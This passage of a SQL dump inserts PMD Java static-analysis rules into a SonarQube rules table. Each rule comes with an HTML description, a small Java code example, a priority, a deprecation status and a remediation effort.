</pre>', 3, NULL, 'READY', 'java', NULL, NULL, NULL, NULL, NULL, 'CONSTANT_ISSUE', NULL, NULL, NULL, '2min', NULL, NULL, NULL, false, 'HTML', 1510817811744, 1510817811745, 1);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (169, 'Empty Statement Not In Loop', 'EmptyStatementNotInLoop', 'rulesets/java/empty.xml/EmptyStatementNotInLoop', 'pmd', 'An empty statement (aka a semicolon by itself) that is not used as the sole body of a for loop or while loop is probably a bug. It could also be a double semicolon, which is useless and should be removed.

<p>
This rule is deprecated, use {rule:squid:EmptyStatementUsageCheck} instead.
</p>', 2, NULL, 'DEPRECATED', 'java', NULL, NULL, NULL, NULL, NULL, 'CONSTANT_ISSUE', NULL, NULL, NULL, '10min', NULL, NULL, NULL, false, 'HTML', 1510817811747, 1510817811748, 1);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (170, 'Loose Coupling (With Type Resolution)', 'LooseCouplingWithTypeResolution', 'rulesets/java/typeresolution.xml/LooseCoupling', 'pmd', 'Avoid using implementation types (i.e., HashSet); use the interface (i.e, Set) instead Example: 
<pre>
import java.util.ArrayList;
import java.util.HashSet;

public class Bar {

  // Use List instead
  private ArrayList list = new ArrayList();

  // Use Set instead
  public HashSet getFoo() {
    return new HashSet();
  }
}
</pre>

<p>
This rule is deprecated, use {rule:squid:S1319} instead.
</p>', 2, NULL, 'DEPRECATED', 'java', NULL, NULL, NULL, NULL, NULL, 'CONSTANT_ISSUE', NULL, NULL, NULL, '10min', NULL, NULL, NULL, false, 'HTML', 1510817811749, 1510817811749, 1);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (171, 'Logic Inversion', 'LogicInversion', 'rulesets/java/design.xml/LogicInversion', 'pmd', 'Use opposite operator instead of negating the whole expression with a logic complement operator. Example: 
<pre>
public boolean bar(int a, int b) {

  if (!(a == b)) // use !=
    return false;

  if (!(a < b)) // use >=
    return false;

  return true;
}
</pre>

<p>
  This rule is deprecated, use {rule:squid:S1940} instead.
</p>', 1, NULL, 'DEPRECATED', 'java', NULL, NULL, NULL, NULL, NULL, 'CONSTANT_ISSUE', NULL, NULL, NULL, '2min', NULL, NULL, NULL, false, 'HTML', 1510817811750, 1510817811751, 1);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (172, 'Guard Log Statement Java Util', 'GuardLogStatementJavaUtil', 'rulesets/java/logging-java.xml/GuardLogStatementJavaUtil', 'pmd', 'Whenever using a log level, one should check if the loglevel is actually enabled, or
otherwise skip the associate String creation and manipulation. Example: 
<pre>
// Add this for performance
if (log.isLoggable(Level.FINE)) { ...
  log.fine("This happens");
</pre>', 2, NULL, 'READY', 'java', NULL, NULL, NULL, NULL, NULL, 'CONSTANT_ISSUE', NULL, NULL, NULL, '5min', NULL, NULL, NULL, false, 'HTML', 1510817811752, 1510817811753, 1);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (174, 'Security - Array is stored directly', 'ArrayIsStoredDirectly', 'rulesets/java/sunsecure.xml/ArrayIsStoredDirectly', 'pmd', 'Constructors and methods receiving arrays should clone objects and store the copy. This prevents that future changes from the user affect the internal functionality.

<p>
  This rule is deprecated, use {rule:squid:S2384} instead.
</p>', 3, NULL, 'DEPRECATED', 'java', NULL, NULL, NULL, NULL, NULL, 'CONSTANT_ISSUE', NULL, NULL, NULL, '20min', NULL, NULL, NULL, false, 'HTML', 1510817811757, 1510817811758, 3);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (175, 'Signature Declare Throws Exception (With Type Resolution)', 'SignatureDeclareThrowsExceptionWithTypeResolution', 'rulesets/java/typeresolution.xml/SignatureDeclareThrowsException', 'pmd', 'It is unclear which exceptions that can be thrown from the methods.
It might be difficult to document and understand the vague interfaces.
Use either a class derived from RuntimeException or a checked exception.

JUnit classes are excluded. Example: 
<pre>
public void methodThrowingException() throws Exception {
}
</pre>

<p>
This rule is deprecated, use {rule:squid:S00112} instead.
</p>', 2, NULL, 'DEPRECATED', 'java', NULL, NULL, NULL, NULL, NULL, 'CONSTANT_ISSUE', NULL, NULL, NULL, '20min', NULL, NULL, NULL, false, 'HTML', 1510817811761, 1510817811761, 1);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (176, 'Abstract naming', 'AbstractNaming', 'rulesets/java/naming.xml/AbstractNaming', 'pmd', 'Abstract classes should be named ''AbstractXXX''. Example :
  <pre>
public abstract class Foo { // should be AbstractFoo
}
  </pre>

<p>
This rule is deprecated, use {rule:squid:S00118} instead.
</p>', 2, NULL, 'DEPRECATED', 'java', NULL, NULL, NULL, NULL, NULL, 'CONSTANT_ISSUE', NULL, NULL, NULL, '5min', NULL, NULL, 'naming', false, 'HTML', 1510817811764, 1510817811764, 1);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (177, 'Avoid StringBuffer field', 'AvoidStringBufferField', 'rulesets/java/strings.xml/AvoidStringBufferField', 'pmd', 'StringBuffers can grow quite a lot, and so may become a source of memory leak (if the owning class has a long life time). Example :
<pre>
class Foo {
  private StringBuffer memoryLeak;
}
</pre>

<p>
  This rule is deprecated, use {rule:squid:S1149} instead.
</p>', 2, NULL, 'DEPRECATED', 'java', NULL, NULL, NULL, NULL, NULL, 'CONSTANT_ISSUE', NULL, NULL, NULL, '20min', NULL, NULL, NULL, false, 'HTML', 1510817811769, 1510817811775, 1);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (178, 'Useless String Value Of', 'UselessStringValueOf', 'rulesets/java/strings.xml/UselessStringValueOf', 'pmd', 'No need to call String.valueOf to append to a string; just use the valueOf() argument directly.

<p>
This rule is deprecated, use {rule:squid:S1153} instead.
</p>', 1, NULL, 'DEPRECATED', 'java', NULL, NULL, NULL, NULL, NULL, 'CONSTANT_ISSUE', NULL, NULL, NULL, '5min', NULL, NULL, NULL, false, 'HTML', 1510817811776, 1510817811777, 1);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (179, 'Comment Content', 'CommentContent', 'rulesets/java/comments.xml/CommentContent', 'pmd', 'A rule for the politically correct... we don''t want to offend anyone. Example: 
<pre>
// OMG, this is horrible, Bob is an idiot !!!
</pre>', 1, NULL, 'READY', 'java', NULL, NULL, NULL, NULL, NULL, 'CONSTANT_ISSUE', NULL, NULL, NULL, '2min', NULL, NULL, NULL, false, 'HTML', 1510817811777, 1510817811778, 1);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (180, 'Proper clone implementation', 'ProperCloneImplementation', 'rulesets/java/clone.xml/ProperCloneImplementation', 'pmd', 'Object clone() should be implemented with super.clone(). Example :
  <pre>
class Foo{
    public Object clone(){
        return new Foo(); // This is bad
    }
}
  </pre>

<p>
This rule is deprecated, use {rule:squid:S1182} instead.
</p>', 3, NULL, 'DEPRECATED', 'java', NULL, NULL, NULL, NULL, NULL, 'CONSTANT_ISSUE', NULL, NULL, NULL, '20min', NULL, NULL, NULL, false, 'HTML', 1510817811780, 1510817811780, 1);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (181, 'Short Class Name', 'ShortClassName', 'rulesets/java/naming.xml/ShortClassName', 'pmd', 'Classnames with fewer than five characters are not recommended. Example: 
<pre>
public class Foo {
}
</pre>

<p>
  This rule is deprecated, use {rule:squid:S00101} instead.
</p>', 1, NULL, 'DEPRECATED', 'java', NULL, NULL, NULL, NULL, NULL, 'CONSTANT_ISSUE', NULL, NULL, NULL, '5min', NULL, NULL, NULL, false, 'HTML', 1510817811781, 1510817811782, 1);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (182, 'At Least One Constructor', 'AtLeastOneConstructor', 'rulesets/java/controversial.xml/AtLeastOneConstructor', 'pmd', 'Each class should declare at least one constructor.

<p>
  This rule is deprecated, use {rule:squid:S1118} or {rule:squid:S1258} instead.
</p>', 2, NULL, 'DEPRECATED', 'java', NULL, NULL, NULL, NULL, NULL, 'CONSTANT_ISSUE', NULL, NULL, NULL, '15min', NULL, NULL, NULL, false, 'HTML', 1510817811784, 1510817811784, 1);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (183, 'Avoid Catching Throwable', 'AvoidCatchingThrowable', 'rulesets/java/strictexception.xml/AvoidCatchingThrowable', 'pmd', 'This is dangerous because it casts too wide a net; it can catch things like OutOfMemoryError.

<p>
This rule is deprecated, use {rule:squid:S1181} instead.
</p>', 3, NULL, 'DEPRECATED', 'java', NULL, NULL, NULL, NULL, NULL, 'CONSTANT_ISSUE', NULL, NULL, NULL, '15min', NULL, NULL, 'error-handling', false, 'HTML', 1510817811785, 1510817811786, 1);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (184, 'Naming - Short method name', 'ShortMethodName', 'rulesets/java/naming.xml/ShortMethodName', 'pmd', 'Detects when very short method names are used. Example :
<pre>
public class ShortMethod {
  public void a( int i ) { // Violation
  }
}
</pre>

<p>
  This rule is deprecated, use {rule:squid:S00100} instead.
</p>', 2, NULL, 'DEPRECATED', 'java', NULL, NULL, NULL, NULL, NULL, 'CONSTANT_ISSUE', NULL, NULL, NULL, '10min', NULL, NULL, 'convention', false, 'HTML', 1510817811787, 1510817811788, 1);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (185, 'Null Assignment', 'NullAssignment', 'rulesets/java/controversial.xml/NullAssignment', 'pmd', 'Assigning a null to a variable (outside of its declaration) is usually bad form. Some times, the assignment is an indication that the programmer doesn''t completely understand what is going on in the code. NOTE: This sort of assignment may in rare cases be useful to encourage garbage collection. If that''s what you''re using it for, by all means, disregard this rule :-)', 2, NULL, 'READY', 'java', NULL, NULL, NULL, NULL, NULL, 'CONSTANT_ISSUE', NULL, NULL, NULL, '15min', NULL, NULL, NULL, false, 'HTML', 1510817811790, 1510817811790, 1);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (186, 'Empty Finally Block', 'EmptyFinallyBlock', 'rulesets/java/empty.xml/EmptyFinallyBlock', 'pmd', '<p>
Avoid empty finally blocks - these can be deleted.
</p>

<p>
This rule is deprecated, use {rule:squid:S00108} instead.
</p>', 3, NULL, 'DEPRECATED', 'java', NULL, NULL, NULL, NULL, NULL, 'CONSTANT_ISSUE', NULL, NULL, NULL, '15min', NULL, NULL, 'error-handling', false, 'HTML', 1510817811792, 1510817811792, 1);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (187, 'Loose Package Coupling', 'LoosePackageCoupling', 'rulesets/java/coupling.xml/LoosePackageCoupling', 'pmd', 'Avoid using classes from the configured package hierarchy outside of the package hierarchy, 
except when using one of the configured allowed classes. Example: 
<pre>
package some.package;

import some.other.package.subpackage.subsubpackage.DontUseThisClass;

public class Bar {
   DontUseThisClass boo = new DontUseThisClass();
}
</pre>

<p>
   This rule is deprecated, use {rule:squid:ArchitecturalConstraint} instead.
</p>', 2, NULL, 'DEPRECATED', 'java', NULL, NULL, NULL, NULL, NULL, 'CONSTANT_ISSUE', NULL, NULL, NULL, '15min', NULL, NULL, NULL, false, 'HTML', 1510817811795, 1510817811796, 1);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (188, 'Finalize Overloaded', 'FinalizeOverloaded', 'rulesets/java/finalizers.xml/FinalizeOverloaded', 'pmd', 'Methods named finalize() should not have parameters. It is confusing and probably a bug to overload finalize(). It will not be called by the VM.

<p>
This rule is deprecated, use {rule:squid:S1175} instead.
</p>', 2, NULL, 'DEPRECATED', 'java', NULL, NULL, NULL, NULL, NULL, 'CONSTANT_ISSUE', NULL, NULL, NULL, '30min', NULL, NULL, NULL, false, 'HTML', 1510817811798, 1510817811798, 1);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (189, 'Position Literals First In Case Insensitive Comparisons', 'PositionLiteralsFirstInCaseInsensitiveComparisons', 'rulesets/java/design.xml/PositionLiteralsFirstInCaseInsensitiveComparisons', 'pmd', 'Position literals first in comparisons, if the second argument is null then NullPointerExceptions 
can be avoided, they will just return false. Example: 
<pre>
class Foo {
  boolean bar(String x) {
    return x.equalsIgnoreCase("2"); // should be "2".equalsIgnoreCase(x)
  }
}
</pre>

<p>
  This rule is deprecated, use {rule:squid:S1132} instead.
</p>', 2, NULL, 'DEPRECATED', 'java', NULL, NULL, NULL, NULL, NULL, 'CONSTANT_ISSUE', NULL, NULL, NULL, '2min', NULL, NULL, NULL, false, 'HTML', 1510817811799, 1510817811800, 1);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (190, 'Field Declarations Should Be At Start Of Class', 'FieldDeclarationsShouldBeAtStartOfClass', 'rulesets/java/design.xml/FieldDeclarationsShouldBeAtStartOfClass', 'pmd', 'Fields should be declared at the top of the class, before any method declarations, constructors, initializers or inner classes. Example: 
<pre>
public class HelloWorldBean {

  // Field declared before methods / inner classes - OK
  private String _thing;

  public String getMessage() {
    return "Hello World!";
  }

  // Field declared after methods / inner classes - avoid this
  private String _fieldInWrongLocation;
}
</pre>

<p>
This rule is deprecated, use {rule:squid:S1213} instead.
</p>', 1, NULL, 'DEPRECATED', 'java', NULL, NULL, NULL, NULL, NULL, 'CONSTANT_ISSUE', NULL, NULL, NULL, '10min', NULL, NULL, NULL, false, 'HTML', 1510817811801, 1510817811801, 1);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (191, 'Avoid Using Short Type', 'AvoidUsingShortType', 'rulesets/java/controversial.xml/AvoidUsingShortType', 'pmd', 'Java uses the short type to reduce memory usage, not to optimize calculation. On the contrary, the jvm does not has an arithmetic capabilities with the type short. So, the P-code must convert the short into int, then do the proper caculation and then again, convert int to short. So, use of the "short" type may have a great effect on memory usage.', 2, NULL, 'READY', 'java', NULL, NULL, NULL, NULL, NULL, 'CONSTANT_ISSUE', NULL, NULL, NULL, '5min', NULL, NULL, NULL, false, 'HTML', 1510817811809, 1510817811809, 1);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (192, 'Misplaced Null Check', 'MisplacedNullCheck', 'rulesets/java/basic.xml/MisplacedNullCheck', 'pmd', 'The null check here is misplaced. if the variable is null you''ll get a NullPointerException. 
Either the check is useless (the variable will never be null) or it''s incorrect.
<br>Example :
<pre>
if (object1!=null && object2.equals(object1)) { 
  ...
}      
</pre>

<p>
  This rule is deprecated, use {rule:squid:S1697} or {rule:squid:S2259} instead.
</p>', 3, NULL, 'DEPRECATED', 'java', NULL, NULL, NULL, NULL, NULL, 'CONSTANT_ISSUE', NULL, NULL, NULL, '5min', NULL, NULL, NULL, false, 'HTML', 1510817811811, 1510817811811, 1);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (193, 'Unnecessary constructor', 'UnnecessaryConstructor', 'rulesets/java/controversial.xml/UnnecessaryConstructor', 'pmd', 'This rule detects when a constructor is not necessary; i.e., when there''s only one constructor, it''s public, has an empty body, and takes no arguments.

<p>
  This rule is deprecated, use {rule:squid:S1186} instead.
</p>', 2, NULL, 'DEPRECATED', 'java', NULL, NULL, NULL, NULL, NULL, 'CONSTANT_ISSUE', NULL, NULL, NULL, '5min', NULL, NULL, NULL, false, 'HTML', 1510817811813, 1510817811813, 1);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (194, 'Do Not Use Threads', 'DoNotUseThreads', 'rulesets/java/j2ee.xml/DoNotUseThreads', 'pmd', 'The J2EE specification explicitly forbid use of threads.', 2, NULL, 'READY', 'java', NULL, NULL, NULL, NULL, NULL, 'CONSTANT_ISSUE', NULL, NULL, NULL, '1h', NULL, NULL, 'multithreading', false, 'HTML', 1510817811819, 1510817811822, 1);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (195, 'Avoid Accessibility Alteration', 'AvoidAccessibilityAlteration', 'rulesets/java/controversial.xml/AvoidAccessibilityAlteration', 'pmd', 'Methods such as getDeclaredConstructors(), getDeclaredConstructor(Class[]) and setAccessible(), as the interface PrivilegedAction, allow to alter, at runtime, the visilibilty of variable, classes, or methods, even if they are private. Obviously, no one should do so, as such behavior is against everything encapsulation principal stands for.', 2, NULL, 'READY', 'java', NULL, NULL, NULL, NULL, NULL, 'CONSTANT_ISSUE', NULL, NULL, NULL, '1h', NULL, NULL, NULL, false, 'HTML', 1510817811823, 1510817811826, 1);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (196, 'Naming - Class naming conventions', 'ClassNamingConventions', 'rulesets/java/naming.xml/ClassNamingConventions', 'pmd', '<p>
Class names should always begin with an upper case character.
</p>

<p>
This rule is deprecated, use {rule:squid:S00101} and {rule:squid:S00114} instead.
</p>', 2, NULL, 'DEPRECATED', 'java', NULL, NULL, NULL, NULL, NULL, 'CONSTANT_ISSUE', NULL, NULL, NULL, '10min', NULL, NULL, 'naming', false, 'HTML', 1510817811827, 1510817811828, 1);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (197, 'Import From Same Package', 'ImportFromSamePackage', 'rulesets/java/imports.xml/ImportFromSamePackage', 'pmd', 'No need to import a type that lives in the same package.

<p>
This rule is deprecated, use {rule:squid:UselessImportCheck} instead.
</p>', 1, NULL, 'DEPRECATED', 'java', NULL, NULL, NULL, NULL, NULL, 'CONSTANT_ISSUE', NULL, NULL, NULL, '5min', NULL, NULL, NULL, false, 'HTML', 1510817811829, 1510817811830, 1);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (198, 'Unconditional If Statement', 'UnconditionalIfStatement', 'rulesets/java/basic.xml/UnconditionalIfStatement', 'pmd', 'Do not use if statements that are always true or always false.

<p>
This rule is deprecated, use {rule:squid:S2583} instead.
</p>', 3, NULL, 'DEPRECATED', 'java', NULL, NULL, NULL, NULL, NULL, 'CONSTANT_ISSUE', NULL, NULL, NULL, '10min', NULL, NULL, NULL, false, 'HTML', 1510817811831, 1510817811831, 1);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (199, 'Unnecessary Conversion Temporary', 'UnnecessaryConversionTemporary', 'rulesets/java/unnecessary.xml/UnnecessaryConversionTemporary', 'pmd', 'Avoid unnecessary temporaries when converting primitives to Strings

<p>
This rule is deprecated, use {rule:squid:S1158} instead.
</p>', 2, NULL, 'DEPRECATED', 'java', NULL, NULL, NULL, NULL, NULL, 'CONSTANT_ISSUE', NULL, NULL, NULL, '5min', NULL, NULL, NULL, false, 'HTML', 1510817811832, 1510817811833, 1);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (200, 'Position Literals First In Comparisons', 'PositionLiteralsFirstInComparisons', 'rulesets/java/design.xml/PositionLiteralsFirstInComparisons', 'pmd', 'Position literals first in String comparisons - that way if the String is null you won''t get a NullPointerException, it''ll just return false.

<p>
This rule is deprecated, use {rule:squid:S1132} instead.
</p>', 2, NULL, 'DEPRECATED', 'java', NULL, NULL, NULL, NULL, NULL, 'CONSTANT_ISSUE', NULL, NULL, NULL, '2min', NULL, NULL, NULL, false, 'HTML', 1510817811834, 1510817811835, 1);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (201, 'Return From Finally Block', 'ReturnFromFinallyBlock', 'rulesets/java/basic.xml/ReturnFromFinallyBlock', 'pmd', 'Avoid returning from a finally block - this can discard exceptions.

<p>
This rule is deprecated, use {rule:squid:S1143} instead.
</p>', 2, NULL, 'DEPRECATED', 'java', NULL, NULL, NULL, NULL, NULL, 'CONSTANT_ISSUE', NULL, NULL, NULL, '20min', NULL, NULL, NULL, false, 'HTML', 1510817811839, 1510817811840, 1);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (202, 'Simple Date Format Needs Locale', 'SimpleDateFormatNeedsLocale', 'rulesets/java/design.xml/SimpleDateFormatNeedsLocale', 'pmd', 'Be sure to specify a Locale when creating a new instance of SimpleDateFormat.', 2, NULL, 'READY', 'java', NULL, NULL, NULL, NULL, NULL, 'CONSTANT_ISSUE', NULL, NULL, NULL, '15min', NULL, NULL, NULL, false, 'HTML', 1510817811841, 1510817811841, 1);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (203, 'Local variable could be final', 'LocalVariableCouldBeFinal', 'rulesets/java/optimizations.xml/LocalVariableCouldBeFinal', 'pmd', 'A local variable assigned only once can be declared final. Example :
  <pre>
public class Bar {
 public void foo () {
  String a = "a"; //if a will not be assigned again it is better to do this:
  final String b = "b";
 }
}
  </pre>', 1, NULL, 'READY', 'java', NULL, NULL, NULL, NULL, NULL, 'CONSTANT_ISSUE', NULL, NULL, NULL, '5min', NULL, NULL, NULL, false, 'HTML', 1510817811842, 1510817811843, 1);
